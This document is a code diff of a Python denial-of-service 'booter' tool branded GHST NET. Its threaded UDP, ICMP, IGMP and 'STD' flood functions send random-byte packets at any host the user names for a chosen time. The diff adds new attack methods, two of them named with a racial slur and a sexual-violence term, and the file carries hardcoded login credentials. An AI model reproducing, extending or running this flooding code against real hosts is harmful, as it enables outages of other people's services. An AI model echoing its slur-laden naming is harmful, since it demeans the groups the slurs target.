@@ -1,5 +1,4 @@
 #!/usr/bin/env python3
-#sinful remake
 #-*- coding: utf-8 -*-
 import sys
 import socket
@@ -26,9 +25,11 @@ method = """\033[91m
 ║ \033[00mUDP  <HOST> <PORT> <TIMEOUT> <SIZE> \033[91m   | \033[00m UDP  ATTACK\033[91m  ║
 ║ \033[00mICMP <HOST> <PORT> <TIMEOUT> <SIZE> \033[91m   | \033[00m ICMP ATTACK\033[91m  ║
 ║ \033[00mSTD  <HOST> <PORT> <TIMEOUT> <SIZE> \033[91m   | \033[00m STD  ATTACK\033[91m  ║
-║ \033[00mRAPE <HOST> <PORT> <TIMEOUT>        \033[91m   | \033[00m CSLAP ATTACK\033[91m ║
+║ \033[00mRAPE <HOST> <PORT> <TIMEOUT> <SIZE> \033[91m   | \033[00m CSLAP ATTACK\033[91m ║
+║ \033[00mCOON <HOST> <PORT> <TIMEOUT> <SIZE> \033[91m   | \033[00m CNUKE ATTACK\033[91m ║
+║ \033[00mslpr <HOST> <PORT> <TIMEOUT> <SIZE> \033[91m   | \033[00m CSLAP ATTACK\033[91m ║
 ║═══════════════════════FREE═METHOD══════════════════════║              
-║ \033[00mSYN  <HOST> <PORT> <TIMEOUT> <SIZE>  \033[91m |\033[00m SYN  ATTACK\033[91m    ║
+║ \033[00mSYN  <HOST> <PORT> <TIMEOUT> <SIZE>  \033[91m  |\033[00m SYN  ATTACK\033[91m   ║
 ╚════════════════════════════════════════════════════════╝\033[00m
 """
  
@@ -90,19 +91,7 @@ statz = """
 \033[00m- PORTSCANS: \033[91m{}                                      
 \033[00m- GRABBED IPS: \033[91m{}                                 
 ╚══════════════════════════════════════════════════════╝\033[00m"""
-banner = f"""{Fore.RED}
-▓█████▄ ▓█████   █████▒▄████▄   ▒█████   ███▄    █    
-▒██▀ ██▌▓█   ▀ ▓██   ▒▒██▀ ▀█  ▒██▒  ██▒ ██ ▀█   █    
-░██   █▌▒███   ▒████ ░▒▓█    ▄ ▒██░  ██▒▓██  ▀█ ██▒                [ Type {Fore.WHITE} HELP {Fore.RED} For Commands ]   
-░▓█▄   ▌▒▓█  ▄ ░▓█▒  ░▒▓▓▄ ▄██▒▒██   ██░▓██▒  ▐▌██▒   
-░▒████▓ ░▒████▒░▒█░   ▒ ▓███▀ ░░ ████▓▒░▒██░   ▓██░   
- ▒▒▓  ▒ ░░ ▒░ ░ ▒ ░   ░ ░▒ ▒  ░░ ▒░▒░▒░ ░ ▒░   ▒ ▒    
- ░ ▒  ▒  ░ ░  ░ ░       ░  ▒     ░ ▒ ▒░ ░ ░░   ░ ▒░   
- ░ ░  ░    ░    ░ ░   ░        ░ ░ ░ ▒     ░   ░ ░    
-   ░       ░  ░       ░ ░          ░ ░           ░    
- ░                    ░                    
-{Fore.RESET}           
-"""
+
  
 altbanner = """▒▒▒▒▒▒▒▒▒▒▒▄▄▄▄░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 ▒▒▒▒▒▒▒▒▒▄██████▒▒▒▒▒▄▄▄█▄▒▒▒▒▒▒▒▒▒▒
@@ -141,13 +130,20 @@ said = 0
 iaid = 0
 haid = 0
 aid = 0
+username = ""
+grade = ""
 attack = True
 http = True
 udp = True
 syn = True
 icmp = True
 std = True
+class Master:
  
+    def __init__(self, grade):
+        self.grade = "null"
+ 
+
  
 def synsender(host, port, timer, payload):
     global uaid
@@ -158,6 +154,24 @@ def synsender(host, port, timer, payload):
  
     timeout = time.time() + float(timer)
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    said += 1
+    aid += 1
+    tattacks += 1
+    while time.time() < timeout and udp and attack:
+        sock.sendto(payload, (host, int(port)))
+    said -= 1
+    aid -= 1
+
+def custom2(host, port, timer, payload):
+    global uaid
+    global udp
+    global aid
+    global tattacks
+    global said
+ 
+    timeout = time.time() + float(timer)
+    sock = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)
     
     said += 1
     aid += 1
@@ -184,8 +198,7 @@ def custom(host, port, timer, payload):
         sock.sendto(payload, (host, int(port)))
     said -= 1
     aid -= 1
-
-
+    
 def udpsender(host, port, timer, punch):
     global uaid
     global udp
@@ -275,6 +288,11 @@ def main():
     global std
  
     while True:
+        grade = "0"
+        if username == "root":
+            grade = "ADMIN"
+        elif username == "guest":
+            grade = "GUEST"
         sys.stdout.write("\x1b]2; G H S T  N E T \x07")
         sin = input("\033[1;00m[\033[91mGHST\033[1;00m]-\033[91m$\033[00m ").lower()
         sinput = sin.split(" ")[0]
@@ -394,7 +412,7 @@ def main():
                 print ("[\033[91mGHST\033[00m] The command {} requires an argument".format (sinput))
                 main()
         elif sinput == "udp":
-            if username == "guests":
+            if username == "guest":
                 print ("[\033[91mGHST\033[00m] You are not allowed to use this method")
                 main()
             else:
@@ -411,16 +429,53 @@ def main():
                     print ("[\033[91mGHST\033[00m] Host: {} invalid".format (host))
                     main()
         elif sinput == "rape":
-            if username == "guests":
+            if username == "guest":
                 print ("[\033[91mGHST\033[00m] You are not allowed to use this method")
                 main()
             else:
                 try:
-                    sinput, host, port, timer = sin.split(" ")
+                    sinput, host, port, timer, pack = sin.split(" ")
                     socket.gethostbyname(host)
                     payload = b"\xff\xff\xff\xff\x67\x65\x74\x63\x68\x61\x6c\x6c\x65\x6e\x67\x65\x20\x30\x20\x22"
                     print ("Attack sent to: {}".format (host))
-                    threading.Thread(target=custom, args=(host, port, timer, payload)).start()
+                    punch = random._urandom(int(pack))
+                    threading.Thread(target=custom, args=(host, port, timer, punch)).start()
+                except ValueError:
+                    print ("[\033[91mGHST\033[00m] The command {} requires an argument".format (sinput))
+                    main()
+                except socket.gaierror:
+                    print ("[\033[91mGHST\033[00m] Host: {} invalid".format (host))
+                    main()
+        elif sinput == "coon":
+            if username == "guest":
+                print ("[\033[91mGHST\033[00m] You are not allowed to use this method")
+                main()
+            else:
+                try:
+                    sinput, host, port, timer, pack = sin.split(" ")
+                    socket.gethostbyname(host)
+                    payload = b"\xff\xff\xff\xff\x67\x65\x74\x63\x68\x61\x6c\x6c\x65\x6e\x67\x65\x20\x30\x20\x22"
+                    print ("COON: Attack sent to: {}".format (host))
+                    punch = random._urandom(int(pack))
+                    threading.Thread(target=custom, args=(host, port, timer, punch)).start()
+                except ValueError:
+                    print ("[\033[91mGHST\033[00m] The command {} requires an argument".format (sinput))
+                    main()
+                except socket.gaierror:
+                    print ("[\033[91mGHST\033[00m] Host: {} invalid".format (host))
+                    main()
+        elif sinput == "slpr":
+            if username == "guest":
+                print ("[\033[91mGHST\033[00m] You are not allowed to use this method")
+                main()
+            else:
+                try:
+                    sinput, host, port, timer, pack = sin.split(" ")
+                    socket.gethostbyname(host)
+                    payload = b"\xff\xff\xff\xff\x67\x65\x74\x63\x68\x61\x6c\x6c\x65\x6e\x67\x65\x20\x30\x20\x22"
+                    print ("SLPR: Attack sent to: {}".format (host))
+                    punch = random._urandom(int(pack))
+                    threading.Thread(target=custom2, args=(host, port, timer, punch)).start()
                 except ValueError:
                     print ("[\033[91mGHST\033[00m] The command {} requires an argument".format (sinput))
                     main()
@@ -428,14 +483,14 @@ def main():
                     print ("[\033[91mGHST\033[00m] Host: {} invalid".format (host))
                     main()
         elif sinput == "std":
-            if username == "guests":
+            if username == "guest":
                 print ("[\033[91mGHST\033[00m] You are not allowed to use this method")
                 main()
             else:
                 try:
                     sinput, host, port, timer, pack = sin.split(" ")
                     socket.gethostbyname(host)
-                    print ("Attack sent to: {}".format (host))
+                    print ("STD: Attack sent to: {}".format (host))
                     punch = random._urandom(int(pack))
                     threading.Thread(target=stdsender, args=(host, port, timer, punch)).start()
                 except ValueError:
@@ -445,7 +500,7 @@ def main():
                     print ("[\033[91mGHST\033[00m] Host: {} invalid".format (host))
                     main()
         elif sinput == "http":
-            if username == "guests":
+            if username == "guest":
                 print ("[\033[91mGHST\033[00m] You are not allowed to use this method")
                 main()
             else:
@@ -462,14 +517,14 @@ def main():
                     print ("[\033[91mGHST\033[00m] Host: {} invalid".format (host))
                     main()
         elif sinput == "icmp":
-            if username == "guests":
+            if username == "guest":
                 print ("[\033[91mGHST\033[00m] You are not allowed to use this method")
                 main()
             else:
                 try:
                     sinput, host, port, timer, pack = sin.split(" ")
                     socket.gethostbyname(host)
-                    print ("Attack sent to: {}".format (host))
+                    print ("ICMP: Attack sent to: {}".format (host))
                     punch = random._urandom(int(pack))
                     threading.Thread(target=icmpsender, args=(host, port, timer, punch)).start()
                 except ValueError:
@@ -482,7 +537,7 @@ def main():
             try:
                 sinput, host, port, timer, pack = sin.split(" ")
                 socket.gethostbyname(host)
-                print ("Attack sent to: {}".format (host))
+                print ("SYN: Attack sent to: {}".format (host))
                 punch = random._urandom(int(pack))
                 threading.Thread(target=icmpsender, args=(host, port, timer, punch)).start()
             except ValueError:
@@ -520,7 +575,7 @@ def main():
  
  
 try:
-    users = ["root", "guests", "me", "ghstdev"]
+    users = ["root", "guest", "me", "ghstdev"]
     clear = "clear"
     os.system (clear)
     username = getpass.getpass ("[+] Username: ")
@@ -533,16 +588,44 @@ except KeyboardInterrupt:
     print ("\nCTRL-C Pressed")
     exit()
 try:
+    
     passwords = ["root", "ghstnet", "me", "ghstdev"]
     password = getpass.getpass ("[+] Password: ")
     if user == "root":
         if password == passwords[0]:
             print ("[+] Login correct, GRADE: ADMIN")
+            grade = "ADMIN"
             cookie.write("DIE")
             time.sleep(2)
             os.system (clear)
+            banner = f"""{Fore.RED}
+▓█████▄ ▓█████   █████▒▄████▄   ▒█████   ███▄    █    
+▒██▀ ██▌▓█   ▀ ▓██   ▒▒██▀ ▀█  ▒██▒  ██▒ ██ ▀█   █    
+░██   █▌▒███   ▒████ ░▒▓█    ▄ ▒██░  ██▒▓██  ▀█ ██▒                [ - Type {Fore.WHITE} HELP {Fore.RED} For Commands  - ]   
+░▓█▄   ▌▒▓█  ▄ ░▓█▒  ░▒▓▓▄ ▄██▒▒██   ██░▓██▒  ▐▌██▒                [- Username: {Fore.WHITE}{username}{Fore.RED} Grade: {Fore.WHITE}{grade}{Fore.RED} -]
+░▒████▓ ░▒████▒░▒█░   ▒ ▓███▀ ░░ ████▓▒░▒██░   ▓██░   
+ ▒▒▓  ▒ ░░ ▒░ ░ ▒ ░   ░ ░▒ ▒  ░░ ▒░▒░▒░ ░ ▒░   ▒ ▒    
+ ░ ▒  ▒  ░ ░  ░ ░       ░  ▒     ░ ▒ ▒░ ░ ░░   ░ ▒░   
+ ░ ░  ░    ░    ░ ░   ░        ░ ░ ░ ▒     ░   ░ ░    
+   ░       ░  ░       ░ ░          ░ ░           ░    
+ ░                    ░                    
+{Fore.RESET}           
+"""
             try:
                 os.system ("clear")
+                banner = f"""{Fore.RED}
+▓█████▄ ▓█████   █████▒▄████▄   ▒█████   ███▄    █    
+▒██▀ ██▌▓█   ▀ ▓██   ▒▒██▀ ▀█  ▒██▒  ██▒ ██ ▀█   █    
+░██   █▌▒███   ▒████ ░▒▓█    ▄ ▒██░  ██▒▓██  ▀█ ██▒                [ - Type {Fore.WHITE} HELP {Fore.RED} For Commands  - ]   
+░▓█▄   ▌▒▓█  ▄ ░▓█▒  ░▒▓▓▄ ▄██▒▒██   ██░▓██▒  ▐▌██▒                [- Username: {Fore.WHITE}{username}{Fore.RED} Grade: {Fore.WHITE}{grade}{Fore.RED} -]
+░▒████▓ ░▒████▒░▒█░   ▒ ▓███▀ ░░ ████▓▒░▒██░   ▓██░   
+ ▒▒▓  ▒ ░░ ▒░ ░ ▒ ░   ░ ░▒ ▒  ░░ ▒░▒░▒░ ░ ▒░   ▒ ▒    
+ ░ ▒  ▒  ░ ░  ░ ░       ░  ▒     ░ ▒ ▒░ ░ ░░   ░ ▒░   
+ ░ ░  ░    ░    ░ ░   ░        ░ ░ ░ ▒     ░   ░ ░    
+   ░       ░  ░       ░ ░          ░ ░           ░    
+ ░                    ░                    
+{Fore.RESET}           
+"""
                 print (banner)
                 main()
             except KeyboardInterrupt:
@@ -551,13 +634,27 @@ try:
         else:
             print ("[+] Incorrect, exiting")
             exit()
-    if user == "guests":
+    if user == "guest":
         if password == passwords[1]:
-            print ("[+] Login correct, GRADE: GUEST_UNPAID")
+            print ("[+] Login correct, GRADE: GUEST")
+            grade = "FREE"
             time.sleep(4)
             os.system (clear)
             try:
                 os.system ("clear")
+                banner = f"""{Fore.RED}
+▓█████▄ ▓█████   █████▒▄████▄   ▒█████   ███▄    █    
+▒██▀ ██▌▓█   ▀ ▓██   ▒▒██▀ ▀█  ▒██▒  ██▒ ██ ▀█   █    
+░██   █▌▒███   ▒████ ░▒▓█    ▄ ▒██░  ██▒▓██  ▀█ ██▒                [ - Type {Fore.WHITE} HELP {Fore.RED} For Commands  - ]   
+░▓█▄   ▌▒▓█  ▄ ░▓█▒  ░▒▓▓▄ ▄██▒▒██   ██░▓██▒  ▐▌██▒                [- Username: {Fore.WHITE}{username}{Fore.RED} Grade: {Fore.WHITE}{grade}{Fore.RED} -]
+░▒████▓ ░▒████▒░▒█░   ▒ ▓███▀ ░░ ████▓▒░▒██░   ▓██░   
+ ▒▒▓  ▒ ░░ ▒░ ░ ▒ ░   ░ ░▒ ▒  ░░ ▒░▒░▒░ ░ ▒░   ▒ ▒    
+ ░ ▒  ▒  ░ ░  ░ ░       ░  ▒     ░ ▒ ▒░ ░ ░░   ░ ▒░   
+ ░ ░  ░    ░    ░ ░   ░        ░ ░ ░ ▒     ░   ░ ░    
+   ░       ░  ░       ░ ░          ░ ░           ░    
+ ░                    ░                    
+{Fore.RESET}           
+"""
                 print (banner)
                 main()
             except KeyboardInterrupt:
